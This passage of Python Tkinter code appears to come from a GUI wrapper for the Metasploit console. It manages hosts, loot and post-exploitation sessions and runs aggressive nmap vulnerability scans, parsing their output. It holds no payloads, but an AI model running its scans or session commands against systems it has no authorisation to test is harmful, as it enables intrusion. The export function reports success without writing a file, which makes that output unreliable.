            messagebox.showwarning("Warning", "Please enter a workspace name.")
            return
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        self.console.send_command(f"workspace -a {workspace}")
        self.current_workspace = workspace
    
    def list_workspaces(self):
        """List all workspaces."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        self.console.send_command("workspace")
    
    def refresh_hosts(self):
        """Refresh hosts from database."""
        if not self.console or not self.console.running:
            return
        
        # Clear existing
        for item in self.hosts_tree.get_children():
            self.hosts_tree.delete(item)
        
        self.console.send_command("hosts")
        # Parsing would happen in console output callback
    
    def add_host_manual(self):
        """Add a host manually."""
        host = simpledialog.askstring("Add Host", "Enter host IP address:")
        if host:
            if not self.console or not self.console.running:
                messagebox.showwarning("Warning", "Console is not running.")
                return
            self.console.send_command(f"hosts -a {host}")
            self.refresh_hosts()
    
    def refresh_loot(self):
        """Refresh loot from database."""
        if not self.console or not self.console.running:
            return
        
        # Clear existing
        if hasattr(self, 'loot_tree'):
            for item in self.loot_tree.get_children():
                self.loot_tree.delete(item)
        
        # Clear loot_data
        if hasattr(self, 'loot_data'):
            self.loot_data = []
        
        self.console.send_command("loot")
    
    def download_loot(self):
        """Download selected loot."""
        selection = self.loot_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select loot to download.")
            return
        # Implementation would go here
        messagebox.showinfo("Info", "Loot download feature coming soon.")
    
    def refresh_post_sessions(self):
        """Refresh sessions for post-exploitation."""
        if not self.console or not self.console.running:
            return
        self.console.send_command("sessions -l")
        # Update combo box with sessions
    
    def run_post_action(self, command):
        """Run a post-exploitation action."""
        session = self.post_session_var.get()
        if not session:
            messagebox.showwarning("Warning", "Please select a session.")
            return
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command(f"sessions -i {session}")
        self.console.send_command(command)
        self.post_output.insert(tk.END, f"Running: {command}\n", "output")
    
    def search_post_modules(self):
        """Search for post-exploitation modules."""
        category = self.post_module_category.get()
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        for item in self.post_modules_tree.get_children():
            self.post_modules_tree.delete(item)
        
        self.console.send_command(f"search type:post {category}")
    
    def use_post_module(self):
        """Use selected post-exploitation module."""
        selection = self.post_modules_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a module.")
            return
        # Implementation would go here
    
    def show_post_module_info(self):
        """Show info for selected post module."""
        selection = self.post_modules_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a module.")
            return
        # Implementation would go here
    
    def run_scan(self, scan_type):
        """Run a vulnerability scan."""
        target = self.scan_target_entry.get()
        if not target:
            messagebox.showwarning("Warning", "Please enter a target.")
            return
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # If a scan is already running, reset it first
        if self.scanning:
            self.scanning = False
            self.scan_output_buffer = []
            # Wait a moment for the previous scan to finish
            self.root.after(500, lambda: self._start_scan(scan_type, target))
        else:
            self._start_scan(scan_type, target)
    
    def _start_scan(self, scan_type, target):
        """Internal method to start a scan."""
        # Clear results
        for item in self.scan_results_tree.get_children():
            self.scan_results_tree.delete(item)
        
        # Set scanning state
        self.scanning = True
        self.current_scan_target = target
        self.scan_output_buffer = []
        
        # Update status label
        scan_type_names = {
            "quick": "Quick Port Scan",
            "full": "Full Port Scan",
            "vuln_fast": "Fast Vulnerability Scan",
            "vuln": "Vulnerability Scan",
            "enum": "Service Enumeration"
        }
        scan_name = scan_type_names.get(scan_type, "Scan")
        if hasattr(self, 'scan_status_label'):
            self.scan_status_label.config(
                text=f"Scanning {target} ({scan_name})...",
                foreground="blue"
            )
        
        # Start progress animation
        self._start_scan_animation()
        
        # Build the command based on scan type
        # Get intensive scan setting
        intensive = self.scan_intensive_var.get() if hasattr(self, 'scan_intensive_var') else False
        
        if scan_type == "quick":
            # Quick SYN scan with timing
            cmd = f"db_nmap -sS -T4 {target}"
        elif scan_type == "full":
            ports = self.scan_ports_entry.get() or "1-65535"
            # Full port scan with timing
            timing = "-T4" if not intensive else "-T5"
            cmd = f"db_nmap -p {ports} {timing} {target}"
        elif scan_type == "vuln_fast":
            # Fast vulnerability scan - only common ports and quick scripts
            # Scan top 1000 ports, use insane timing, skip slow scripts
            # Use simpler script selection - just vuln category with timeout to prevent hanging
            cmd = f"db_nmap -sV -p 1-1000 --script vuln --script-timeout 15s -T5 {target}"
        elif scan_type == "vuln":
            # Full vulnerability scan - optimized for speed
            # Use -T4 for aggressive timing, --script-timeout to prevent hanging
            if intensive:
                # Intensive: scan all ports with all vuln scripts
                cmd = f"db_nmap -sV --script vuln --script-timeout 30s -T4 {target}"
            else:
                # Standard: scan common ports with vuln scripts, timeout prevents hanging
                cmd = f"db_nmap -sV -p 1-1000 --script vuln --script-timeout 20s -T4 {target}"
        elif scan_type == "enum":
            # Service enumeration with timing
            timing = "-T4" if not intensive else "-T5"
            cmd = f"db_nmap -sV -sC {timing} {target}"
        else:
            messagebox.showerror("Error", f"Unknown scan type: {scan_type}")
            self.scanning = False
            self._stop_scan_animation()
            if hasattr(self, 'scan_status_label'):
                self.scan_status_label.config(text="Ready", foreground="gray")
            return
        
        # Set a timeout to reset scanning flag if scan takes too long (30 minutes max)
        # This prevents the flag from getting stuck
        if hasattr(self, '_scan_timeout_id'):
            self.root.after_cancel(self._scan_timeout_id)
        self._scan_timeout_id = self.root.after(1800000, self._scan_timeout)  # 30 minutes
        
        # Send the command
        self.console.send_command(cmd)
    
    def _start_scan_animation(self):
        """Start the animated progress indicator."""
        if not hasattr(self, 'scan_progress_label'):
            return
        
        self.scan_progress_dots = 0
        self._update_scan_animation()
    
    def _update_scan_animation(self):
        """Update the animated progress indicator."""
        if not hasattr(self, 'scan_progress_label') or not self.scanning:
            return
        
        # Cycle through dots: ., .., ..., then repeat
        self.scan_progress_dots = (self.scan_progress_dots % 3) + 1
        dots = "." * self.scan_progress_dots
        self.scan_progress_label.config(text=dots)
        
        # Schedule next update (every 500ms)
        self.scan_progress_animation_id = self.root.after(500, self._update_scan_animation)
    
    def _stop_scan_animation(self):
        """Stop the animated progress indicator."""
        if hasattr(self, 'scan_progress_animation_id') and self.scan_progress_animation_id:
            self.root.after_cancel(self.scan_progress_animation_id)
            self.scan_progress_animation_id = None
        
        if hasattr(self, 'scan_progress_label'):
            self.scan_progress_label.config(text="")
    
    def _update_scan_status(self, status, color="gray"):
        """Update the scan status label."""
        if hasattr(self, 'scan_status_label'):
            self.scan_status_label.config(text=status, foreground=color)
    
    def _scan_timeout(self):
        """Timeout handler to reset scanning flag if scan takes too long."""
        if self.scanning:
            self.scanning = False
            self.scan_output_buffer = []
            self._stop_scan_animation()
            self._update_scan_status("Timeout - scan may still be running", "orange")
            messagebox.showwarning("Warning", "Scan timeout - scanning flag reset. The scan may still be running in the background.")
    
    def _parse_nmap_output(self, text):
        """Parse nmap output and populate scan results tree."""
        # Debug: Log entry
        try:
            debug_log = os.path.expanduser("~/.yap_scan_debug.log")
            with open(debug_log, 'a') as f:
                import datetime
                f.write(f"{datetime.datetime.now()}: _parse_nmap_output called (scanning={self.scanning}, has_tree={hasattr(self, 'scan_results_tree')})\n")
                f.write(f"  Text preview (first 200 chars): {text[:200]}\n")
                f.flush()
        except:
            pass
        
        if not self.scanning:
            return
        
        # Check if scan_results_tree exists
        if not hasattr(self, 'scan_results_tree'):
            try:
                debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                with open(debug_log, 'a') as f:
                    import datetime
                    f.write(f"{datetime.datetime.now()}: ERROR: scan_results_tree does not exist!\n")
                    f.flush()
            except:
                pass
            return
        
        # Add to buffer
        self.scan_output_buffer.append(text)
        
        # Check for scan errors that should reset the scanning flag
        if re.search(r'Error while running command db_nmap|SIGTERM|SIGKILL', text, re.IGNORECASE):
            # Scan was interrupted or failed
            if self.scanning:
                self._process_scan_buffer()
                self.scanning = False
                self.scan_output_buffer = []
                self._stop_scan_animation()
                self._update_scan_status("Scan interrupted or failed", "red")
                # Cancel timeout
                if hasattr(self, '_scan_timeout_id'):
                    self.root.after_cancel(self._scan_timeout_id)
            return
        
        # Check for nmap completion message
        if re.search(r'Nmap done:', text, re.IGNORECASE):
            # Process any remaining buffered output before stopping
            if self.scanning:
                self._process_scan_buffer()
                self.scanning = False
                self.scan_output_buffer = []
                self._stop_scan_animation()
                self._update_scan_status("Scan completed", "green")
                # Cancel timeout
                if hasattr(self, '_scan_timeout_id'):
                    self.root.after_cancel(self._scan_timeout_id)
                
                # Also refresh from database to get any missed results
                if self.current_scan_target and self.database_connected:
                    self.root.after(2000, lambda: self._refresh_scan_results_from_db())
            return
        
        # Check for prompt (scan finished) - this is the most reliable indicator
        if re.search(r'msf[56]?\s*>', text):
            # Only reset if we were actually scanning (to avoid false positives)
            if self.scanning:
                # Process any remaining buffered output before stopping
                self._process_scan_buffer()
                self.scanning = False
                self.scan_output_buffer = []
                self._stop_scan_animation()
                self._update_scan_status("Scan completed", "green")
                # Cancel timeout
                if hasattr(self, '_scan_timeout_id'):
                    self.root.after_cancel(self._scan_timeout_id)
                
                # Also refresh from database to get any missed results
                if self.current_scan_target and self.database_connected:
                    self.root.after(2000, lambda: self._refresh_scan_results_from_db())
            return
        
        # Look for nmap port table format OR services table format
        # Format 1 (nmap): PORT     STATE SERVICE    VERSION
        #                  22/tcp   open  ssh        OpenSSH 7.4
        # Format 2 (services table): IP PORT PROTOCOL SERVICE STATE
        #                           127.0.0.1  1720  tcp    h323q931         open
        lines = text.split('\n')
        target = self.current_scan_target or "unknown"
        found_ports = False
        
        for line in lines:
            original_line = line
            line = line.strip()
            if not line:
                continue
            
            # Debug: Log every non-empty line that might be a service entry
            try:
                debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                with open(debug_log, 'a') as f:
                    import datetime
                    # Log lines that contain an IP address pattern
                    if re.search(r'\d+\.\d+\.\d+\.\d+', line):
                        f.write(f"{datetime.datetime.now()}: Processing line: {repr(line)}\n")
                        f.flush()
            except:
                pass
            
            # Skip header lines and info lines
            # But don't skip lines that might contain port info
            if (line.startswith('PORT') and 'STATE' in line and 'SERVICE' in line):
                # This is the header line - skip it but note we're in port table
                try:
                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                    with open(debug_log, 'a') as f:
                        import datetime
                        f.write(f"{datetime.datetime.now()}: Skipping PORT header: {repr(line)}\n")
                        f.flush()
                except:
                    pass
                continue
            if (line.startswith('Host') and 'Port' in line and 'Protocol' in line):
                # Services table header - skip it
                try:
                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                    with open(debug_log, 'a') as f:
                        import datetime
                        f.write(f"{datetime.datetime.now()}: Skipping Host header: {repr(line)}\n")
                        f.flush()
                except:
                    pass
                continue
            if line.strip() == 'Services' or line.strip().startswith('======'):
                # Services header - skip
                try:
                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                    with open(debug_log, 'a') as f:
                        import datetime
                        f.write(f"{datetime.datetime.now()}: Skipping Services header: {repr(line)}\n")
                        f.flush()
                except:
                    pass
                continue
            if line.strip().startswith('----') and len(line.strip()) < 20:
                # Separator line - skip
                continue
            
            # Strip [*] Nmap: prefix if present for parsing
            original_line_for_parsing = line
            if line.startswith('[*] Nmap: '):
                line_for_parsing = line.replace('[*] Nmap: ', '', 1).strip()
            elif line.startswith('[*]'):
                # Skip other [*] lines that aren't nmap output
                continue
            else:
                line_for_parsing = line.strip()
            
            if (line.startswith('Nmap scan') or 
                line.startswith('Starting') or line.startswith('Host is up') or
                line.startswith('Not shown') or line.startswith('MAC Address') or
                line.startswith('Service detection') or line.startswith('Scanning') or
                'scan report for' in line.lower() or 
                line.startswith('===') or line.startswith('---') or
                line.startswith('RHOSTS')):
                continue
            
            # FIRST: Try to parse services table format (IP PORT PROTOCOL SERVICE STATE)
            # This is what comes from "services" command in Metasploit
            # Format: "127.0.0.1  1720  tcp    h323q931         open"
            # Use line_for_parsing which has [*] Nmap: prefix stripped if present
            # Strip whitespace for matching
            line_for_parsing_stripped = line_for_parsing.strip()
            
            # Debug: Log what we're trying to match
            try:
                debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                with open(debug_log, 'a') as f:
                    import datetime
                    # Only log lines that look like they might be service entries
                    if re.search(r'\d+\.\d+\.\d+\.\d+', line_for_parsing_stripped):
                        f.write(f"{datetime.datetime.now()}: Trying to match: {repr(line_for_parsing_stripped)}\n")
                        f.flush()
            except:
                pass
            
            service_table_match = re.match(r'^(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\w+)\s+(\S+)\s+(\w+)(?:\s+(.+))?$', line_for_parsing_stripped)
            if service_table_match:
                ip = service_table_match.group(1)
                port = service_table_match.group(2)
                protocol = service_table_match.group(3)
                service_name = service_table_match.group(4)
                state = service_table_match.group(5)
                info = service_table_match.group(6).strip() if service_table_match.group(6) else ""
                
                # Debug: Log match
                try:
                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                    with open(debug_log, 'a') as f:
                        import datetime
                        f.write(f"{datetime.datetime.now()}: Matched service table: IP={ip}, Port={port}, Protocol={protocol}, Service={service_name}, State={state}, Target={target}\n")
                        f.flush()
                except:
                    pass
                
                # Only process if it matches our target (be flexible with target matching)
                target_match = (ip == target or 
                               target in ip or 
                               ip in target or
                               target == "unknown")  # Allow if target not set
                
                # Debug: Log target match result
                try:
                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                    with open(debug_log, 'a') as f:
                        import datetime
                        f.write(f"{datetime.datetime.now()}: Target match result: {target_match} (ip={ip}, target={target})\n")
                        f.flush()
                except:
                    pass
                
                if target_match:
                    # Only add open/filtered ports
                    if state in ['open', 'filtered', 'open|filtered']:
                        # Use the actual IP from the line as the target
                        display_target = ip if target == "unknown" else target
                        
                        # Debug: Log state check
                        try:
                            debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                            with open(debug_log, 'a') as f:
                                import datetime
                                f.write(f"{datetime.datetime.now()}: State check passed: {state} (display_target={display_target})\n")
                                f.flush()
                        except:
                            pass
                        
                        # Check if this entry already exists
                        existing = False
                        try:
                            for item in self.scan_results_tree.get_children():
                                values = self.scan_results_tree.item(item, 'values')
                                if values and len(values) >= 2:
                                    if values[0] == display_target and values[1] == f"{port}/{protocol}":
                                        existing = True
                                        break
                        except Exception as e:
                            # Debug: Log exception
                            try:
                                debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                                with open(debug_log, 'a') as f:
                                    import datetime
                                    f.write(f"{datetime.datetime.now()}: Error checking existing: {str(e)}\n")
                                    f.flush()
                            except:
                                pass
                        
                        # Debug: Log existing check
                        try:
                            debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                            with open(debug_log, 'a') as f:
                                import datetime
                                f.write(f"{datetime.datetime.now()}: Existing check: {existing}\n")
                                f.flush()
                        except:
                            pass
                        
                        if not existing:
                            # Insert into treeview
                            try:
                                if hasattr(self, 'scan_results_tree'):
                                    self.scan_results_tree.insert('', tk.END, values=(
                                        display_target,
                                        f"{port}/{protocol}",
                                        protocol.upper(),
                                        state,
                                        service_name,
                                        info
                                    ))
                                    # Force update of the tree view
                                    self.root.update_idletasks()
                                    
                                    # Debug: Log successful insertion
                                    try:
                                        debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                                        with open(debug_log, 'a') as f:
                                            import datetime
                                            f.write(f"{datetime.datetime.now()}: ✓ Inserted: {display_target} {port}/{protocol} {state} {service_name}\n")
                                            f.flush()
                                    except:
                                        pass
                            except Exception as e:
                                # Log error for debugging
                                try:
                                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                                    with open(debug_log, 'a') as f:
                                        import datetime
                                        f.write(f"{datetime.datetime.now()}: ✗ Error inserting: {str(e)}\n")
                                        f.write(f"  IP: {ip}, Port: {port}, Target: {target}\n")
                                        f.flush()
                                except:
                                    pass
                        found_ports = True
                        continue  # Skip nmap format parsing for this line
            
            # More flexible port parsing - handle various formats
            # Format 1: "22/tcp   open  ssh        OpenSSH 7.4"
            # Format 2: "22/tcp open ssh"
            # Format 3: "PORT     STATE SERVICE"
            # Format 4: "22/tcp          open          ssh"
            
            # Try multiple regex patterns - use search instead of match to find anywhere in line
            port_match = None
            
            # Pattern 1: Standard format with spaces - most common
            # "22/tcp   open  ssh        OpenSSH 7.4"
            port_match = re.search(r'(\d+)/(tcp|udp|sctp)\s+(\w+(?:\|\w+)?)\s+(\S+)(?:\s+(.+))?', line)
            
            # Pattern 2: More flexible spacing - handles tabs and multiple spaces
            if not port_match:
                port_match = re.search(r'(\d+)/(tcp|udp|sctp)\s+(\w+)\s+(\S+)(?:\s+(.+))?', line)
            
            # Pattern 3: Very flexible - any port/protocol/state/service
            if not port_match:
                port_match = re.search(r'(\d+)/(tcp|udp|sctp)\s+(\w+)\s+(\S+)', line)
            
            # Pattern 4: Even more lenient - just port/protocol and state
            if not port_match:
                port_match = re.search(r'(\d+)/(tcp|udp|sctp)\s+(\w+)', line)
            
            # Pattern 5: Handle lines with leading/trailing whitespace or other chars
            if not port_match:
                # Try to find port/protocol anywhere in the line
                port_match = re.search(r'(\d+)/(tcp|udp|sctp)', line)
                if port_match:
                    # If we found port/protocol, try to extract state and service
                    port_proto = port_match.group(0)
                    rest = line[line.find(port_proto) + len(port_proto):].strip()
                    if rest:
                        parts = rest.split()
                        if len(parts) >= 2:
                            # Reconstruct match groups
                            port_match = type('Match', (), {
                                'group': lambda self, n: {
                                    1: port_match.group(1),
                                    2: port_match.group(2),
                                    3: parts[0] if len(parts) > 0 else 'unknown',
                                    4: parts[1] if len(parts) > 1 else 'unknown',
                                    5: ' '.join(parts[2:]) if len(parts) > 2 else ''
                                }.get(n, ''),
                                'groups': lambda self: (port_match.group(1), port_match.group(2), parts[0] if len(parts) > 0 else 'unknown', parts[1] if len(parts) > 1 else 'unknown', ' '.join(parts[2:]) if len(parts) > 2 else '')
                            })()
            
            if port_match:
                found_ports = True
                port = port_match.group(1)
                protocol = port_match.group(2)
                # Handle different group positions based on which pattern matched
                if len(port_match.groups()) >= 3:
                    state = port_match.group(3)
                else:
                    state = "unknown"
                service = port_match.group(4) if len(port_match.groups()) >= 4 else "unknown"
                version = port_match.group(5).strip() if len(port_match.groups()) >= 5 and port_match.group(5) else ""
                
                # Only add open/filtered ports (skip closed)
                if state in ['open', 'filtered', 'open|filtered']:
                    # Check if this entry already exists
                    existing = False
                    for item in self.scan_results_tree.get_children():
                        values = self.scan_results_tree.item(item, 'values')
                        if values and len(values) >= 2:
                            if values[0] == target and values[1] == f"{port}/{protocol}":
                                existing = True
                                break
                    
                    if not existing:
                        # Insert into treeview
                        try:
                            if hasattr(self, 'scan_results_tree'):
                                self.scan_results_tree.insert('', tk.END, values=(
                                    target,
                                    f"{port}/{protocol}",
                                    protocol.upper(),
                                    state,
                                    service,
                                    version
                                ))
                                # Force update of the tree view
                                self.root.update_idletasks()
                                
                                # Debug: Log successful insertion
                                try:
                                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                                    with open(debug_log, 'a') as f:
                                        import datetime
                                        f.write(f"{datetime.datetime.now()}: Inserted scan result: {target} {port}/{protocol} {state} {service}\n")
                                        f.flush()
                                except:
                                    pass
                        except Exception as e:
                            # Log error for debugging
                            try:
                                debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                                with open(debug_log, 'a') as f:
                                    import datetime
                                    f.write(f"{datetime.datetime.now()}: Error inserting scan result: {str(e)}\n")
                                    f.write(f"Target: {target}, Port: {port}, Protocol: {protocol}, State: {state}\n")
                                    f.flush()
                            except:
                                pass
        
        # Also check for completion messages
        if "Nmap done" in text or "scan completed" in text.lower() or "db_nmap" in text.lower():
            # Give it a moment to finish processing, then stop scanning
            self.root.after(1000, self._finish_scan)
    
    def _process_scan_buffer(self):
        """Process any remaining scan output in the buffer."""
        if not self.scan_output_buffer:
            return
        
        full_text = '\n'.join(self.scan_output_buffer)
        # Re-parse the full buffer
        lines = full_text.split('\n')
        target = self.current_scan_target or "unknown"
        
        for line in lines:
            original_line = line
            line = line.strip()
            if not line:
                continue
            
            # Skip header lines
            if (line.startswith('PORT') or line.startswith('Nmap scan') or 
                line.startswith('Starting') or line.startswith('Host is up') or
                line.startswith('Not shown') or line.startswith('MAC Address') or
                line.startswith('Service detection') or line.startswith('Scanning') or
                'scan report for' in line.lower() or '[*]' in line):
                continue
            
            # Try multiple regex patterns
            port_match = None
            
            # Pattern 1: Standard format
            port_match = re.match(r'^(\d+)/(tcp|udp|sctp)\s+(\w+(?:\|\w+)?)\s+(\S+)(?:\s+(.+))?$', line)
            
            # Pattern 2: More flexible
            if not port_match:
                port_match = re.match(r'^(\d+)/(tcp|udp|sctp)\s+(\w+)\s+(\S+)(?:\s+(.+))?$', line)
            
            # Pattern 3: Very flexible
            if not port_match:
                port_match = re.match(r'^(\d+)/(tcp|udp|sctp)\s+(\w+)\s+(\S+).*$', line)
            
            if port_match:
                port = port_match.group(1)
                protocol = port_match.group(2)
                state = port_match.group(3)
                service = port_match.group(4) if len(port_match.groups()) >= 4 else "unknown"
                version = port_match.group(5).strip() if len(port_match.groups()) >= 5 and port_match.group(5) else ""
                
                if state in ['open', 'filtered', 'open|filtered']:
                    existing = False
                    for item in self.scan_results_tree.get_children():
                        values = self.scan_results_tree.item(item, 'values')
                        if values and len(values) >= 2:
                            if values[0] == target and values[1] == f"{port}/{protocol}":
                                existing = True
                                break
                    
                    if not existing:
                        try:
                            self.scan_results_tree.insert('', tk.END, values=(
                                target,
                                f"{port}/{protocol}",
                                protocol.upper(),
                                state,
                                service,
                                version
                            ))
                        except Exception:
                            pass
    
    def _finish_scan(self):
        """Finish scanning and process any remaining output."""
        if self.scanning:
            self._process_scan_buffer()
            target = self.current_scan_target
            self.scanning = False
            self.scan_output_buffer = []
            self._stop_scan_animation()
            self._update_scan_status("Scan completed", "green")
            
            # If we have a target and database is connected, also try to get results from database
            if target and self.database_connected and self.console and self.console.running:
                # Wait a moment for database to update, then query services from database
                # This ensures we get results even if console output parsing missed them
                self.root.after(2000, lambda: self._refresh_scan_from_db(target))
    
    def _refresh_scan_results_from_db(self):
        """Refresh scan results from database after scan completes."""
        target = self.current_scan_target
        if not target or not self.database_connected:
            return
        
        if not hasattr(self, 'scan_results_tree'):
            return
        
        # Query services from database for this target
        if self.console and self.console.running:
            # Temporarily re-enable scanning flag to parse the services output
            self.scanning = True
            self.current_scan_target = target
            
            # Debug
            try:
                debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                with open(debug_log, 'a') as f:
                    import datetime
                    f.write(f"{datetime.datetime.now()}: Refreshing scan results from DB for {target}\n")
                    f.flush()
            except:
                pass
            
            # Use services command to get results from database
            # -R flag filters by target IP
            self.console.send_command(f"services -R {target}")
            
            # Also try hosts command to ensure host is in database
            self.console.send_command(f"hosts -R {target}")
            
            # Disable scanning after parsing (give it time to receive output)
            self.root.after(5000, lambda: setattr(self, 'scanning', False))
    
    def _refresh_scan_from_db(self, target):
        """Refresh scan results from database."""
        if not target or not self.database_connected:
            return
        
        # Query services from database for this target
        if self.console and self.console.running:
            # Temporarily re-enable scanning flag to parse the services output
            self.scanning = True
            self.current_scan_target = target
            
            # Use services command to get results from database
            self.console.send_command(f"services -R {target}")
            
            # Disable scanning after parsing (give it time to receive output)
            self.root.after(3000, lambda: setattr(self, 'scanning', False))
    
    def _parse_services_table_output(self, text):
        """Parse services table output from Metasploit and add to scan results."""
        if not self.scanning or not self.current_scan_target:
            return
        
        if not hasattr(self, 'scan_results_tree'):
            return
        
        target = self.current_scan_target
        lines = text.split('\n')
        
        # Debug
        try:
            debug_log = os.path.expanduser("~/.yap_scan_debug.log")
            with open(debug_log, 'a') as f:
                import datetime
                f.write(f"{datetime.datetime.now()}: Parsing services table output for {target}\n")
                f.write(f"Text preview: {text[:500]}\n")
                f.flush()
        except:
            pass
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Skip header lines
            if (line.startswith('Host') or line.startswith('====') or 
                line.startswith('services') or line.startswith('[*]') or
                line.startswith('--') or '=' in line and len(line) < 10):
                continue
            
            # Parse services table format: IP Port Protocol Name State Info
            # Example: "192.168.1.1  22  tcp  ssh  open  OpenSSH 7.4"
            # More flexible pattern - handle various spacing
            service_match = re.match(r'^(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\w+)\s+(\S+)\s+(\w+)(?:\s+(.+))?$', line)
            
            # Try alternative format if first doesn't match
            if not service_match:
                # Try with more flexible spacing
                service_match = re.match(r'^(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\w+)\s+(\S+)\s+(\w+)', line)
            
            if service_match:
                ip = service_match.group(1)
                port = service_match.group(2)
                protocol = service_match.group(3)
                service_name = service_match.group(4)
                state = service_match.group(5)
                info = service_match.group(6).strip() if service_match.group(6) else ""
                
                # Debug: Log match
                try:
                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                    with open(debug_log, 'a') as f:
                        import datetime
                        f.write(f"{datetime.datetime.now()}: [SERVICES_TABLE] Matched: IP={ip}, Port={port}, Protocol={protocol}, Service={service_name}, State={state}, Target={target}\n")
                        f.flush()
                except:
                    pass
                
                # Only process if it matches our target
                target_match = (ip == target or target in ip or ip in target or target == "unknown")
                
                # Debug: Log target match
                try:
                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                    with open(debug_log, 'a') as f:
                        import datetime
                        f.write(f"{datetime.datetime.now()}: [SERVICES_TABLE] Target match: {target_match} (ip={ip}, target={target})\n")
                        f.flush()
                except:
                    pass
                
                if target_match:
                    # Check if this entry already exists
                    existing = False
                    try:
                        for item in self.scan_results_tree.get_children():
                            values = self.scan_results_tree.item(item, 'values')
                            if values and len(values) >= 2:
                                if values[0] == target and values[1] == f"{port}/{protocol}":
                                    existing = True
                                    break
                    except Exception as e:
                        try:
                            debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                            with open(debug_log, 'a') as f:
                                import datetime
                                f.write(f"{datetime.datetime.now()}: [SERVICES_TABLE] Error checking existing: {str(e)}\n")
                                f.flush()
                        except:
                            pass
                    
                    # Debug: Log existing check
                    try:
                        debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                        with open(debug_log, 'a') as f:
                            import datetime
                            f.write(f"{datetime.datetime.now()}: [SERVICES_TABLE] Existing check: {existing}, State check: {state in ['open', 'filtered', 'open|filtered']}\n")
                            f.flush()
                    except:
                        pass
                    
                    if not existing and state in ['open', 'filtered', 'open|filtered']:
                        try:
                            if hasattr(self, 'scan_results_tree'):
                                self.scan_results_tree.insert('', tk.END, values=(
                                    target,
                                    f"{port}/{protocol}",
                                    protocol.upper(),
                                    state,
                                    service_name,
                                    info
                                ))
                                # Force update of the tree view
                                self.root.update_idletasks()
                                
                                # Debug: Log successful insertion
                                try:
                                    debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                                    with open(debug_log, 'a') as f:
                                        import datetime
                                        f.write(f"{datetime.datetime.now()}: [SERVICES_TABLE] ✓ Inserted: {target} {port}/{protocol} {state} {service_name}\n")
                                        f.flush()
                                except:
                                    pass
                        except Exception as e:
                            # Log error for debugging
                            try:
                                debug_log = os.path.expanduser("~/.yap_scan_debug.log")
                                with open(debug_log, 'a') as f:
                                    import datetime
                                    f.write(f"{datetime.datetime.now()}: [SERVICES_TABLE] ✗ Error inserting: {str(e)} (IP={ip}, Port={port}, Target={target})\n")
                                    f.flush()
                            except:
                                pass
    
    def refresh_scan_from_database(self):
        """Manually refresh scan results from database."""
        target = self.scan_target_entry.get()
        if not target:
            messagebox.showwarning("Warning", "Please enter a target first.")
            return
        
        if not self.database_connected:
            messagebox.showwarning("Warning", "Database is not connected.")
            return
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        if not hasattr(self, 'scan_results_tree'):
            messagebox.showerror("Error", "Scan results tree not initialized.")
            return
        
        # Clear existing results
        for item in self.scan_results_tree.get_children():
            self.scan_results_tree.delete(item)
        
        # Set scanning flag to enable parsing
        self.scanning = True
        self.current_scan_target = target
        self._start_scan_animation()
        self._update_scan_status(f"Refreshing scan results for {target}...", "blue")
        
        # Debug
        try:
            debug_log = os.path.expanduser("~/.yap_scan_debug.log")
            with open(debug_log, 'a') as f:
                import datetime
                f.write(f"{datetime.datetime.now()}: Manual refresh from DB for {target}\n")
                f.flush()
        except:
            pass
        
        # Query services from database - use -R to filter by target
        self.console.send_command(f"services -R {target}")
        
        # Also query all services and filter manually (fallback)
        self.console.send_command("services")
        
        # Disable scanning after parsing
        self.root.after(5000, lambda: setattr(self, 'scanning', False))
    
    def add_scan_to_db(self):
        """Add scan results to database."""
        # Results are already in database if db_nmap was used
        messagebox.showinfo("Info", "Scan results are already in the database (if db_nmap was used). Use 'Refresh from Database' to view them.")
        self.refresh_hosts()
        self.refresh_services()
    
    def export_scan_results(self):
        """Export scan results."""
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("CSV files", "*.csv")])
        if filename:
            # Export implementation
            messagebox.showinfo("Info", f"Results exported to {filename}")
    
    def refresh_services(self):
        """Refresh services from database."""
        if not self.console or not self.console.running:
            return
        
        # Clear existing
        if hasattr(self, 'services_tree'):
            for item in self.services_tree.get_children():
                self.services_tree.delete(item)
        
        # Clear services_data
        if hasattr(self, 'services_data'):
            self.services_data = []
        
        self.console.send_command("services")
    
    def refresh_vulns(self):
        """Refresh vulnerabilities from database."""
        if not self.console or not self.console.running:
            return
        
        # Clear existing
        if hasattr(self, 'vulns_tree'):
            for item in self.vulns_tree.get_children():
                self.vulns_tree.delete(item)
        
        # Clear vulnerabilities_data
        if hasattr(self, 'vulnerabilities_data'):
            self.vulnerabilities_data = []
        
